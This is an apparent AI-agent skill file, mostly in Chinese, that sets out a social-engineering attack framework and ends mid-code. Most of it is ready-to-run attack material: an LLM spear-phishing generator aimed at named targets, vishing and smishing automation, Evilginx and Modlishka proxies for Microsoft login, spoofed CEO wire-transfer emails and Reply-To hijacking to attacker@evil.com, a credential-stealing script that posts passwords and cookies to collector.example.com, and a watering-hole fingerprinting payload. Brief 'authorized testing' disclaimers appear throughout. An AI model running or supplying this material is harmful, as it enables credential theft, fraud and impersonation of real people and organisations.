---
name: "social-engineering-framework"
description: "社会工程学攻击框架：钓鱼攻击/水坑攻击/信息收集/2026 AI社工/DeepFake/社工库/物理社工/邮件伪造/SPF/DKIM绕过"
---

# SKILL: 社会工程学攻击框架 — Social Engineering Attack Framework

> **AI LOAD INSTRUCTION**: 完整社会工程学攻击框架，覆盖钓鱼攻击（鱼叉/批量/Smishing/Vishing/Quishing）、邮件伪造（SPF/DKIM/DMARC绕过）、钓鱼页面克隆（HTTPS伪装/Typosquatting/IDN同形异义字）、水坑攻击（恶意JS注入/供应链污染/CDN投毒）、信息收集（OSINT/社交媒体挖掘/泄露数据库）、2026 AI社工（LLM钓鱼/DeepFake语音克隆/AI虚假身份）、社工库技术（数据清洗/关联分析/知识图谱）、物理社工（尾随/USB投递/工作证伪造）、社工防御对抗（安全培训绕过/钓鱼演练检测/沙箱逃逸/浏览器指纹伪造）、合规与法律边界（授权测试/红队演练规则/证据保留）。适用于红队演练、授权渗透测试、安全意识培训评估。

## 0. RELATED ROUTING

Use this file for social engineering attack frameworks. Also load:

- [email-header-injection](../email-header-injection/SKILL.md) for email header injection fundamentals, SMTP relay abuse, and BCC exfiltration patterns
- [dns-pollution-hijacking](../dns-pollution-hijacking/SKILL.md) for DNS poisoning and hijacking techniques used in phishing infrastructure
- [isp-traffic-hijacking](../isp-traffic-hijacking/SKILL.md) for ISP-level traffic manipulation and SSL stripping in MITM phishing scenarios
- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) for bypassing WAF protections on phishing landing pages
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) for XSS payloads used in watering hole attack JS injection
- [supply-chain-attacks](../supply-chain-attacks/SKILL.md) for supply chain poisoning techniques used in watering hole and CDN attacks
- [subdomain-takeover](../subdomain-takeover/SKILL.md) for domain takeover techniques used in phishing infrastructure
- [recon-and-methodology](../recon-and-methodology/SKILL.md) for structured testing methodology, authorization, and evidence handling
- [account-opening-security](../account-opening-security/SKILL.md) for KYC bypass and identity fraud techniques relevant to social engineering
- [security-awareness-training](../security-awareness-training/SKILL.md) for defensive training approaches against social engineering

---

## 1. 钓鱼攻击 (Phishing Attacks)

钓鱼攻击是社会工程学中最核心的攻击手段，2026年钓鱼攻击已深度整合AI技术，成功率大幅提升。

### 1.1 鱼叉式钓鱼 (Spear Phishing)

鱼叉式钓鱼针对特定目标个人或组织进行精准攻击，需要深入的前期信息收集。

**目标信息收集脚本**：

```bash
# 收集目标社交媒体信息
theHarvester -d target-company.com -b google,linkedin,github,shodan -f harvest-results.html

# LinkedIn 公开信息抓取
linkedin2username --company "Target Corporation" --domain target-company.com -o linkedin_users.txt

# 生成目标邮箱格式
python3 -c "
import itertools
with open('names.txt') as f:
    names = [line.strip().split() for line in f]
formats = ['{first}.{last}', '{first[0]}{last}', '{first}', '{first}_{last}']
for name in names:
    for fmt in formats:
        print(fmt.format(first=name[0].lower(), last=name[1].lower()) + '@target.com')
" > email_variants.txt
```

**Gophish 鱼叉钓鱼平台部署**：

```bash
# 部署 Gophish 钓鱼平台
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
cd gophish-v0.12.1-linux-64bit

# 修改配置监听 0.0.0.0
sed -i 's/127.0.0.1/0.0.0.0/g' config.json

# 修改 admin_server 为 true 监听外部
# 启动
./gophish

# 通过 REST API 自动化创建钓鱼活动
curl -X POST http://localhost:3333/api/campaigns/ \
  -H "Authorization: Bearer YOUR_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Q4 Security Awareness",
    "template": {"name": "Password Reset"},
    "page": {"name": "O365 Login"},
    "url": "https://phish.target-company.com",
    "smtp": {"name": "SendGrid SMTP"},
    "groups": [{"name": "Engineering Team"}],
    "launch_date": "2026-01-15T08:00:00Z"
  }'
```

**2026 AI 驱动的鱼叉式钓鱼邮件生成**：

```python
#!/usr/bin/env python3
"""
AI-Powered Spear Phishing Email Generator (2026)
使用 LLM 基于目标信息生成高度个性化的钓鱼邮件
仅用于授权红队演练
"""
import json
import os
from openai import OpenAI

client = OpenAI(api_key=os.environ.get("OPENAI_API_KEY"))

def generate_spear_phish(target_profile: dict, scenario: str) -> dict:
    """
    基于目标画像生成个性化钓鱼邮件
    target_profile: 包含姓名、职位、公司、社交媒体活动、最近项目等信息
    """
    system_prompt = """You are a red team security professional conducting authorized social engineering tests.
    Generate realistic phishing emails. All content must be for authorized testing only.
    Follow ethical guidelines strictly."""

    user_prompt = f"""
    Based on the following target profile, generate a highly personalized spear-phishing email
    for the scenario: {scenario}

    Target Profile:
    - Name: {target_profile.get('name', 'Unknown')}
    - Position: {target_profile.get('position', 'Unknown')}
    - Company: {target_profile.get('company', 'Unknown')}
    - Recent Projects: {target_profile.get('recent_projects', [])}
    - Interests: {target_profile.get('interests', [])}
    - Recent Posts: {target_profile.get('recent_posts', [])}

    Generate:
    1. Email subject line (3 variants)
    2. Email body with personalization
    3. Pretext/backstory
    4. Call-to-action (link/attachment mention)
    5. Urgency/appeal technique used

    Make it indistinguishable from legitimate business communication.
    Target language: {target_profile.get('language', 'English')}

    IMPORTANT: This is for authorized security testing. Include X-Phish-Test header marker.
    """

    response = client.chat.completions.create(
        model="gpt-4o",
        messages=[
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": user_prompt}
        ],
        temperature=0.8,
        max_tokens=2000
    )

    return {
        "target": target_profile.get('name'),
        "scenario": scenario,
        "generated_content": response.choices[0].message.content,
        "model": "gpt-4o",
        "timestamp": "2026-07-25T00:00:00Z"
    }

# 批量生成
targets = [
    {
        "name": "Zhang Wei",
        "position": "VP Engineering",
        "company": "TechCorp",
        "recent_projects": ["Cloud Migration Q3", "AI Platform Launch"],
        "interests": ["Kubernetes", "Machine Learning", "Golf"],
        "language": "Chinese"
    }
]

for target in targets:
    result = generate_spear_phish(target, "IT Security Update - Password Policy Change")
    print(json.dumps(result, indent=2, ensure_ascii=False))
```

### 1.2 批量钓鱼 (Mass Phishing)

**SMS 批量钓鱼 (Smishing) 基础设施**：

```bash
# 使用 Twilio API 发送批量 SMS（需合法授权）
# 注意：仅用于授权安全测试
curl -X POST https://api.twilio.com/2010-04-01/Accounts/$TWILIO_SID/Messages.json \
  --data-urlencode "Body=【安全通知】您的企业邮箱即将过期，请立即验证: https://verify-company.com" \
  --data-urlencode "From=+18665551234" \
  --data-urlencode "To=+8613800138000" \
  -u $TWILIO_SID:$TWILIO_AUTH_TOKEN

# 使用 SMS 网关批量发送
# 短信内容模板（中文）
cat > sms_templates.txt << 'EOF'
【{company}】尊敬的{name}，您的{service}服务将于{date}到期，请及时续费: {url}
【{company}】安全提醒：检测到您的账号在异地登录，如非本人操作请立即验证: {url}
【HR通知】{name}您好，请于{date}前完成年度绩效考核自评: {url}
EOF
```

**语音钓鱼 (Vishing) 自动化脚本**：

```python
#!/usr/bin/env python3
"""
Vishing 自动化呼叫系统（授权测试用）
使用 Twilio Programmable Voice + AI TTS
"""
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Say, Gather

class VishingAutomation:
    """自动化语音钓鱼呼叫系统"""

    def __init__(self, account_sid: str, auth_token: str):
        self.client = Client(account_sid, auth_token)

    def create_vishing_flow(self, target_name: str, company: str, scenario: str):
        """创建语音钓鱼 IVR 流程"""
        response = VoiceResponse()

        # 开场白
        response.say(
            f"您好，我是{company}信息技术部的。我们检测到您的账户有异常登录活动。",
            voice="alice",
            language="zh-CN"
        )

        # 收集信息
        gather = Gather(
            input="speech dtmf",
            timeout=5,
            num_digits=1,
            action="/vishing/handle-input",
            method="POST"
        )
        gather.say(
            "为确认您的身份，请输入您的员工编号，或直接说出您的姓名。",
            voice="alice",
            language="zh-CN"
        )
        response.append(gather)

        return str(response)

    def launch_campaign(self, targets: list, caller_id: str, twiml_url: str):
        """批量发起语音钓鱼呼叫"""
        results = []
        for target in targets:
            call = self.client.calls.create(
                url=twiml_url,
                to=target['phone'],
                from_=caller_id,
                status_callback=f"https://callback.example.com/status/{target['id']}",
                status_callback_event=["initiated", "ringing", "answered", "completed"]
            )
            results.append({
                "target": target['name'],
                "call_sid": call.sid,
                "status": call.status,
                "timestamp": call.date_created.isoformat()
            })
        return results

# 使用示例
# visher = VishingAutomation(TWILIO_SID, TWILIO_TOKEN)
# results = visher.launch_campaign(targets, "+18665550000", "https://phish.example.com/twiml")
```

**二维码钓鱼 (Quishing)**：

```python
#!/usr/bin/env python3
"""
Quishing 二维码钓鱼生成器
生成伪装成合法服务的钓鱼二维码
"""
import qrcode
from PIL import Image, ImageDraw, ImageFont
import base64

class QuishingGenerator:
    """生成钓鱼二维码"""

    def __init__(self, redirect_domain: str):
        self.redirect_domain = redirect_domain

    def generate_quishing_qr(self, target_url: str, scenario: str,
                              output_path: str, overlay_text: str = None):
        """
        生成带有伪装场景的钓鱼二维码
        支持场景: "m365-auth", "wifi-login", "payment", "wechat-follow"
        """
        # 生成二维码
        qr = qrcode.QRCode(
            version=3,
            error_correction=qrcode.constants.ERROR_CORRECT_H,
            box_size=10,
            border=4,
        )
        qr.add_data(target_url)
        qr.make(fit=True)

        qr_img = qr.make_image(fill_color="black", back_color="white").convert('RGB')

        # 添加场景化伪装
        canvas = Image.new('RGB', (qr_img.width + 200, qr_img.height + 200), 'white')
        canvas.paste(qr_img, (100, 50))

        draw = ImageDraw.Draw(canvas)

        # 场景化文案
        scenario_texts = {
            "m365-auth": "请使用 Microsoft Authenticator 扫描",
            "wifi-login": "扫描二维码连接 Wi-Fi",
            "payment": "微信/支付宝扫码支付",
            "wechat-follow": "微信扫码关注公众号",
            "meeting-signin": "会议签到码"
        }

        text = scenario_texts.get(scenario, "扫描二维码")
        draw.text((canvas.width // 2, 10), text, fill="black",
                  anchor="mt", font=ImageFont.load_default())

        canvas.save(output_path)
        return output_path

    def generate_qr_with_logo(self, target_url: str, logo_path: str,
                               output_path: str):
        """在二维码中心嵌入Logo（增加可信度）"""
        qr = qrcode.QRCode(
            version=5,
            error_correction=qrcode.constants.ERROR_CORRECT_H,
            box_size=10,
            border=4,
        )
        qr.add_data(target_url)
        qr.make(fit=True)

        qr_img = qr.make_image(fill_color="#0066CC", back_color="white").convert('RGB')
        qr_img = qr_img.resize((400, 400))

        # 嵌入Logo
        logo = Image.open(logo_path).convert('RGBA')
        logo_size = 80
        logo = logo.resize((logo_size, logo_size))

        logo_pos = ((qr_img.width - logo_size) // 2, (qr_img.height - logo_size) // 2)
        qr_img.paste(logo, logo_pos, logo)

        qr_img.save(output_path)
        return output_path
```

### 1.3 钓鱼基础设施搭建

**Evilginx3 反向代理钓鱼部署**：

```bash
# 安装 Evilginx3
git clone https://github.com/kgretzky/evilginx2.git /opt/evilginx3
cd /opt/evilginx3
make

# 配置域名和IP
# 设置 A 记录: phish.example.com -> VPS_IP
# 设置 NS 记录: ns1.example.com -> VPS_IP

# 启动 Evilginx3
./bin/evilginx3 -p ./phishlets/

# 配置 phishlet
config domain phish.example.com
config ipv4 external VPS_IP

# 加载 Microsoft 365 phishlet
phishlets hostname o365 phish.example.com
phishlets enable o365

# 创建钓鱼链接
lures create o365
lures get-url 0

# 捕获的会话和凭证
sessions
sessions 0
# 查看捕获的 cookie session
```

**Modlishka 反向代理部署**：

```bash
# 部署 Modlishka
git clone https://github.com/drk1wi/Modlishka.git /opt/modlishka
cd /opt/modlishka

# 生成 TLS 证书
openssl req -new -x509 -keyout modlishka.key -out modlishka.crt \
  -days 365 -nodes -subj "/CN=login.microsoftonline.com"

# 配置 JSON
cat > modlishka-config.json << 'EOF'
{
  "proxyDomain": "phish.example.com",
  "listeningAddress": "0.0.0.0",
  "proxyAddress": "0.0.0.0",
  "target": "login.microsoftonline.com",
  "targetResources": [
    "login.microsoftonline.com",
    "aadcdn.msauth.net",
    "login.live.com"
  ],
  "terminateTriggers": "",
  "terminateRedirectUrl": "",
  "trackingCookie": "id",
  "trackingParam": "id",
  "jsRules": "",
  "jsReflectParam": "rf",
  "forceHTTPS": true,
  "forceHTTP": false,
  "dynamicMode": false,
  "debug": false,
  "logPostOnly": false,
  "disableSecurity": false,
  "cert": "modlishka.crt",
  "certKey": "modlishka.key",
  "certPool": ""
}
EOF

# 启动
./bin/proxy -config modlishka-config.json
```

---

## 2. 邮件伪造 (Email Spoofing)

邮件伪造是钓鱼攻击的核心技术支撑，涉及 SPF、DKIM、DMARC 三大邮件认证协议的绕过。

### 2.1 SPF 绕过技术

**SPF 记录分析与绕过**：

```bash
# 查询目标域名的 SPF 记录
dig TXT target.com | grep "v=spf1"
nslookup -type=TXT target.com

# 使用 spfquery 验证 SPF
spfquery -ip SENDING_IP -sender user@target.com -helo mail.target.com

# 分析 SPF 弱点
python3 << 'EOF'
import dns.resolver
import ipaddress

def analyze_spf(domain):
    """分析 SPF 记录的弱点"""
    try:
        answers = dns.resolver.resolve(domain, 'TXT')
        for rdata in answers:
            txt = rdata.to_text().strip('"')
            if 'v=spf1' in txt:
                print(f"[+] SPF Record: {txt}")
                # 检查常见弱点
                weaknesses = []
                if '+all' in txt:
                    weaknesses.append("CRITICAL: +all allows ALL IPs to send")
                if '?all' in txt:
                    weaknesses.append("HIGH: ?all (neutral) - weak protection")
                if '~all' in txt:
                    weaknesses.append("MEDIUM: ~all (softfail) - can be bypassed")
                if 'include:' in txt:
                    includes = [p.split(':')[1] for p in txt.split() if p.startswith('include:')]
                    weaknesses.append(f"INFO: SPF includes {len(includes)} domains - check each for misconfig")
                    for inc in includes:
                        weaknesses.append(f"  -> include:{inc} (may have permissive SPF)")
                if 'ip4:' in txt:
                    ip_ranges = [p.split(':')[1] for p in txt.split() if p.startswith('ip4:')]
                    for ipr in ip_ranges:
                        net = ipaddress.ip_network(ipr, strict=False)
                        weaknesses.append(f"  -> ip4:{ipr} (covers {net.num_addresses} addresses)")
                if 'ptr' in txt:
                    weaknesses.append("HIGH: PTR mechanism - DNS-based, can be spoofed")
                if 'a' in txt and 'mx' not in txt:
                    weaknesses.append("MEDIUM: 'a' without 'mx' - check A record control")
                if 'exists' in txt:
                    weaknesses.append("INFO: exists mechanism - check for wildcard DNS")

                for w in weaknesses:
                    print(f"  [!] {w}")

                # SPF DNS lookup limit check (10 lookup limit)
                lookup_count = txt.count('include:') + txt.count('a:') + txt.count('mx:') + txt.count('ptr:') + txt.count('exists:')
                if lookup_count > 10:
                    print(f"  [!!!] CRITICAL: {lookup_count} DNS lookups exceed SPF limit of 10 - SPF is effectively BROKEN")
                return txt
    except Exception as e:
        print(f"[-] Error: {e}")

analyze_spf("target.com")
EOF
```

**利用 SPF 配置错误发送邮件**：

```bash
# 场景1: 目标使用 +all (允许所有IP)
# 直接使用任何 SMTP 服务器发送即可

# 场景2: SPF ~all (softfail) - 配合发件人显示名欺骗
# 使用 swaks 发送邮件
swaks --to victim@target.com \
      --from "CEO Name <ceo@target.com>" \
      --header "Subject: Urgent: Wire Transfer Request" \
      --body "Please process the attached wire transfer immediately." \
      --server smtp.mailgun.org \
      --auth LOGIN \
      --auth-user YOUR_MAILGUN_USER \
      --auth-password YOUR_MAILGUN_PASS

# 场景3: 利用 SPF include 的第三方服务
# 如果 target.com SPF 包含 include:sendgrid.net，则攻击者只需使用 SendGrid
# 配置 SendGrid 发送域名验证邮件
```

### 2.2 DKIM 伪造

**DKIM 记录分析**：

```bash
# 查询 DKIM 选择器
dig TXT google._domainkey.target.com
dig TXT selector1._domainkey.target.com
dig TXT selector2._domainkey.target.com

# 常见 DKIM 选择器字典
selectors="google s1 s2 default mail k1 k2 selector1 selector2 dkim 2024 2025 2026 smtp mandrill sendgrid"

for sel in $selectors; do
    result=$(dig TXT ${sel}._domainkey.target.com +short)
    if [ -n "$result" ]; then
        echo "[+] Found DKIM selector: $sel -> $result"
    fi
done
```

**DKIM 弱密钥利用**：

```python
#!/usr/bin/env python3
"""
DKIM 弱密钥分析和利用
"""
import dns.resolver
import base64
import re
from cryptography.hazmat.primitives.asymmetric import rsa, ec

class DKIMAnalyzer:
    """DKIM 记录弱密钥分析"""

    def __init__(self, domain: str):
        self.domain = domain

    def extract_dkim_key(self, selector: str) -> dict:
        """提取 DKIM 公钥并分析"""
        try:
            answers = dns.resolver.resolve(f"{selector}._domainkey.{self.domain}", 'TXT')
            txt = ' '.join([r.to_text().strip('"') for r in answers])

            result = {"selector": selector, "raw": txt}

            # 提取密钥参数
            k_match = re.search(r'k=(\w+)', txt)
            result['key_type'] = k_match.group(1) if k_match else 'rsa'

            p_match = re.search(r'p=([A-Za-z0-9+/=]+)', txt)
            if p_match:
                key_b64 = p_match.group(1)
                result['key_b64'] = key_b64
                try:
                    key_der = base64.b64decode(key_b64)
                    result['key_length_bytes'] = len(key_der)

                    if result['key_type'] == 'rsa':
                        pubkey = rsa.RSAPublicKey.from_public_bytes(key_der)
                        result['key_size_bits'] = pubkey.key_size
                        if pubkey.key_size < 1024:
                            result['vulnerability'] = "CRITICAL: RSA key < 1024 bits - can be factored"
                        elif pubkey.key_size == 1024:
                            result['vulnerability'] = "HIGH: RSA 1024-bit - factorable with sufficient resources"
                        elif pubkey.key_size < 2048:
                            result['vulnerability'] = "MEDIUM: RSA below 2048-bit"
                    elif result['key_type'] == 'ed25519':
                        result['key_size_bits'] = 256
                        result['vulnerability'] = "NONE: Ed25519 is secure"
                except Exception as e:
                    result['parse_error'] = str(e)
            else:
                result['key_b64'] = None
                result['vulnerability'] = "CRITICAL: p= tag is empty - DKIM is effectively disabled"

            # 检查测试模式
            if 't=y' in txt or 't=s:y' in txt:
                result['test_mode'] = True
                result['vulnerability'] = (result.get('vulnerability', '') +
                    " | INFO: DKIM in test mode (t=y) - failures may not reject")

            return result

        except Exception as e:
            return {"selector": selector, "error": str(e)}

    def scan_all_selectors(self, selectors: list) -> list:
        """扫描所有 DKIM 选择器"""
        results = []
        for sel in selectors:
            result = self.extract_dkim_key(sel)
            if 'error' not in result:
                results.append(result)
        return results

# 使用
analyzer = DKIMAnalyzer("target.com")
selectors = ["google", "s1", "s2", "default", "dkim", "mail", "2025", "2026"]
results = analyzer.scan_all_selectors(selectors)
for r in results:
    print(f"Selector: {r['selector']}, Key: {r.get('key_size_bits', 'N/A')} bits, "
          f"Vuln: {r.get('vulnerability', 'None')}")
```

### 2.3 DMARC 绕过

**DMARC 策略分析**：

```bash
# 查询 DMARC 记录
dig TXT _dmarc.target.com

# DMARC 策略分析脚本
python3 << 'EOF'
import dns.resolver

def analyze_dmarc(domain):
    try:
        answers = dns.resolver.resolve(f"_dmarc.{domain}", 'TXT')
        for rdata in answers:
            txt = rdata.to_text().strip('"')
            if 'v=DMARC1' in txt:
                print(f"[+] DMARC Record: {txt}")
                if 'p=none' in txt:
                    print("  [!] CRITICAL: p=none - DMARC is in monitoring only mode")
                    print("  [>] Any spoofed email will be delivered")
                elif 'p=quarantine' in txt:
                    print("  [!] MEDIUM: p=quarantine - emails go to spam, not rejected")
                elif 'p=reject' in txt:
                    print("  [+] p=reject - spoofed emails are rejected (but check subdomain policy)")

                if 'sp=none' in txt or 'sp=quarantine' in txt:
                    print("  [!] Subdomain policy is weak - subdomain spoofing possible")

                if 'pct=' in txt:
                    import re
                    pct = re.search(r'pct=(\d+)', txt)
                    if pct and int(pct.group(1)) < 100:
                        print(f"  [!] pct={pct.group(1)} - only {pct.group(1)}% of emails are filtered")

                if 'rua=' not in txt:
                    print("  [!] No RUA reporting - no visibility into spoofing attempts")

                return txt
    except dns.resolver.NXDOMAIN:
        print(f"[!!!] CRITICAL: No DMARC record for {domain} - COMPLETELY vulnerable to spoofing")
    except Exception as e:
        print(f"[-] Error: {e}")
    return None

analyze_dmarc("target.com")
EOF
```

**DMARC 绕过技术**：

```bash
# 技术1: 利用子域名（如果主域 DMARC 严格但子域名策略宽松）
# 从 ceo@mail.target.com 发送（而非 ceo@target.com）
swaks --to victim@target.com \
      --from "CEO <ceo@mail.target.com>" \
      --header "Subject: Urgent Request" \
      --body "Please approve the attached." \
      --server smtp.example.com --auth LOGIN --auth-user USER --auth-pass PASS

# 技术2: 利用相似域名（Look-alike Domains）
# 注册 target-sec.com 或 target.co 等相似域名
swaks --to victim@target.com \
      --from "IT Support <support@target-sec.com>" \
      --header "Subject: Security Update Required" \
      --body "Please login to verify your account." \
      --server smtp.example.com --auth LOGIN --auth-user USER --auth-pass PASS

# 技术3: 发件人显示名欺骗（Display Name Spoofing）
# 即使 SPF/DKIM/DMARC 都通过，显示名欺骗仍然有效
# 因为邮件客户端显示的是"发件人名字"而非邮件地址
swaks --to victim@target.com \
      --from "Target IT Security <attacker@evil.com>" \
      --header "Subject: Immediate Password Reset Required" \
      --body "Click here to verify: https://evil.com/reset" \
      --server smtp.example.com --auth LOGIN --auth-user USER --auth-pass PASS
```

### 2.4 Reply-To 劫持

```bash
# Reply-To 头注入 - 发件人显示合法，但回复地址被劫持
swaks --to victim@target.com \
      --from "legitimate@target.com" \
      --header "Reply-To: attacker@evil.com" \
      --header "Subject: Re: Contract Renewal - Q3 2026" \
      --body "Please find the updated contract attached. Let me know if you have questions." \
      --server smtp.example.com --auth LOGIN --auth-user USER --auth-pass PASS

# 多 Reply-To 头注入
swaks --to victim@target.com \
      --from "finance@target.com" \
      --add-header "Reply-To: finance@target.com" \
      --add-header "Reply-To: attacker@evil.com" \
      --header "Subject: Invoice Payment - Wire Transfer Details" \
      --body "Please use the following new bank details for the upcoming payment..."
```

---

## 3. 钓鱼页面克隆 (Phishing Page Cloning)

### 3.1 HTTPS 证书伪装

**Let's Encrypt 证书自动化申请**：

```bash
# 使用 Certbot 为钓鱼域名申请合法 Let's Encrypt 证书
certbot certonly --standalone \
  -d phish.example.com \
  -d login.phish.example.com \
  --non-interactive --agree-tos \
  --email admin@example.com

# 证书路径
# /etc/letsencrypt/live/phish.example.com/fullchain.pem
# /etc/letsencrypt/live/phish.example.com/privkey.pem

# Nginx 反向代理配置
cat > /etc/nginx/sites-available/phish-proxy << 'NGINX'
server {
    listen 443 ssl http2;
    server_name phish.example.com;

    ssl_certificate /etc/letsencrypt/live/phish.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/phish.example.com/privkey.pem;

    location / {
        proxy_pass https://login.microsoftonline.com;
        proxy_set_header Host login.microsoftonline.com;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Real-IP $remote_addr;

        # 关键：替换响应中的目标域名
        sub_filter 'login.microsoftonline.com' 'phish.example.com';
        sub_filter_once off;
        sub_filter_types *;
    }
}
NGINX

# 启用站点
ln -s /etc/nginx/sites-available/phish-proxy /etc/nginx/sites-enabled/
nginx -t && systemctl reload nginx
```

**OV/EV 证书外观伪造**：

```bash
# 使用自签名证书（配合浏览器信任诱导）
# 制作看起来像 EV 证书的 Details
openssl req -x509 -newkey rsa:4096 -keyout ev-fake.key -out ev-fake.crt \
  -days 365 -nodes \
  -subj "/C=US/ST=Washington/L=Redmond/O=Microsoft Corporation/OU=IT Security/CN=login.microsoft.com"

# 为钓鱼页面添加证书视觉元素
# 在 HTML 中伪造锁定图标和公司名称展示
```

### 3.2 域名抢注与 Typosquatting

**域名抢注自动化工具**：

```bash
# 安装 dnstwist
pip3 install dnstwist

# 生成所有可能的域名变体
dnstwist --format csv target.com | tee typosquat_analysis.csv

# 检测变体
dnstwist --registered target.com | tee registered_variants.txt

# 常见域名变体模式
dnstwist --ssdeep --mxcheck --geoip target.com

# 使用 URLCrazy
urlcrazy -p -r target.com
urlcrazy -k target.com  # 键盘布局错误变体
```

**IDN 同形异义字攻击 (Homograph Attack)**：

```python
#!/usr/bin/env python3
"""
IDN Homograph Attack Domain Generator
生成使用 Unicode 同形异义字的钓鱼域名
"""
import unicodedata

class IDNHomographGenerator:
    """IDN 同形异义字域名生成器"""

    # 常见同形异义字映射
    HOMOGLYPHS = {
        'a': ['\u0430'],  # Cyrillic 'а'
        'c': ['\u0441'],  # Cyrillic 'с'
        'e': ['\u0435'],  # Cyrillic 'е'
        'i': ['\u0456'],  # Cyrillic 'і'
        'o': ['\u043E'],  # Cyrillic 'о'
        'p': ['\u0440'],  # Cyrillic 'р'
        's': ['\u0455'],  # Cyrillic 'ѕ'
        'x': ['\u0445'],  # Cyrillic 'х'
        'y': ['\u0443'],  # Cyrillic 'у'
        'A': ['\u0410'],  # Cyrillic 'А'
        'B': ['\u0412'],  # Cyrillic 'В'
        'C': ['\u0421'],  # Cyrillic 'С'
        'E': ['\u0415'],  # Cyrillic 'Е'
        'H': ['\u041D'],  # Cyrillic 'Н'
        'I': ['\u0406'],  # Cyrillic 'І'
        'J': ['\u0408'],  # Cyrillic 'Ј'
        'K': ['\u041A'],  # Cyrillic 'К'
        'M': ['\u041C'],  # Cyrillic 'М'
        'O': ['\u041E'],  # Cyrillic 'О'
        'P': ['\u0420'],  # Cyrillic 'Р'
        'T': ['\u0422'],  # Cyrillic 'Т'
        'X': ['\u0425'],  # Cyrillic 'Х'
        'Y': ['\u04AE'],  # Cyrillic 'Ү'
        '3': ['\u0417'],  # Cyrillic 'З'
        '4': ['\u04AF'],  # Cyrillic 'ү'
        'g': ['\u0261'],  # Latin small letter script G
        'w': ['\u051D'],  # Cyrillic 'ԝ'
        'n': ['\u0578'],  # Armenian 'n'
        'm': ['\u1D5A'],  # modifier letter
        'l': ['\u04CF'],  # Cyrillic 'ӏ'
        'j': ['\u0458'],  # Cyrillic 'ј'
    }

    @staticmethod
    def generate_variants(domain: str) -> list:
        """生成所有可能的同形异义字变体"""
        variants = []
        name, tld = domain.rsplit('.', 1) if '.' in domain else (domain, '')

        for i, char in enumerate(name):
            if char in IDNHomographGenerator.HOMOGLYPHS:
                for replacement in IDNHomographGenerator.HOMOGLYPHS[char]:
                    variant = name[:i] + replacement + name[i+1:]
                    idna = variant.encode('idna').decode('ascii')
                    full = f"{idna}.{tld}" if tld else idna
                    variants.append({
                        "original": domain,
                        "variant": variant,
                        "punycode": full,
                        "position": i,
                        "original_char": char,
                        "replacement": f"U+{ord(replacement):04X}"
                    })
        return variants

    @staticmethod
    def detect_homograph(domain: str) -> list:
        """检测域名是否包含同形异义字"""
        suspicious = []
        for i, char in enumerate(domain):
            if char == '.':
                continue
            cat = unicodedata.category(char)
            if cat.startswith('L') and char.isascii():
                continue
            if ord(char) > 127:
                suspicious.append({
                    "position": i,
                    "char": char,
                    "unicode": f"U+{ord(char):04X}",
                    "name": unicodedata.name(char, "UNKNOWN"),
                    "category": cat
                })
        return suspicious

# 使用
gen = IDNHomographGenerator()
variants = gen.generate_variants("microsoft.com")
for v in variants[:10]:
    print(f"Original: {v['original']} -> Variant: {v['variant']} -> Punycode: {v['punycode']}")

# 检测可疑域名
suspicious = gen.detect_homograph("m\u0456crosoft.com")
print(f"Homograph detection: {suspicious}")
```

### 3.3 页面克隆工具链

**完整的页面克隆和部署流程**：

```bash
# 使用 SingleFile 克隆完整页面
npx single-file-cli https://login.microsoftonline.com/ output.html

# 使用 HTTrack 克隆整个站点
httrack "https://example.com/login" -O ./cloned-site \
  "+*.example.com/*" -v

# 注入凭证捕获脚本
cat > credential-stealer.js << 'JSEOF'
// 凭证捕获器 - 注入到克隆页面中
(function() {
    'use strict';

    // 拦截表单提交
    document.addEventListener('submit', function(e) {
        var form = e.target;
        var formData = new FormData(form);
        var credentials = {};

        for (var pair of formData.entries()) {
            credentials[pair[0]] = pair[1];
        }

        // 发送到收集服务器
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://collector.example.com/capture', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({
            url: window.location.href,
            credentials: credentials,
            cookies: document.cookie,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString()
        }));

        // 不阻止默认提交行为，让用户体验流畅
    });

    // 拦截 fetch API 调用
    var originalFetch = window.fetch;
    window.fetch = function() {
        var url = arguments[0];
        var options = arguments[1] || {};

        if (options.body && typeof options.body === 'string') {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://collector.example.com/capture', false);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({
                url: url,
                body: options.body,
                method: options.method,
                timestamp: new Date().toISOString()
            }));
        }

        return originalFetch.apply(this, arguments);
    };
})();
JSEOF

# 将凭证捕获脚本注入到克隆页面
sed -i 's|</body>|<script src="credential-stealer.js"></script></body>|' output.html
```

---

## 4. 水坑攻击 (Watering Hole Attacks)

### 4.1 恶意 JS 注入

**水坑攻击 JS Payload 库**：

```javascript
/**
 * 水坑攻击 JS 注入框架
 * 仅用于授权红队演练
 */
const WateringHole = {
    // 配置
    config: {
        collectorUrl: 'https://collector.example.com',
        beaconInterval: 30000, // 30秒心跳
        fingerprintEnabled: true,
        exploitEnabled: false
    },

    // 浏览器指纹收集
    collectFingerprint: function() {
        const fp = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenResolution: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cpuCores: navigator.hardwareConcurrency || 'unknown',
            memory: navigator.deviceMemory || 'unknown',
            gpu: this.getGPUInfo(),
            plugins: this.getPlugins(),
            canvas: this.getCanvasFingerprint(),
            webgl: this.getWebGLFingerprint(),
            audio: this.getAudioFingerprint(),
            fonts: [], // 异步收集
            cookies: navigator.cookieEnabled,
            localStorage: !!window.localStorage,
            sessionStorage: !!window.sessionStorage,
            doNotTrack: navigator.doNotTrack,
            touchSupport: 'ontouchstart' in window,
            referrer: document.referrer,
            url: window.location.href
        };
        return fp;
    },

    getGPUInfo: function() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
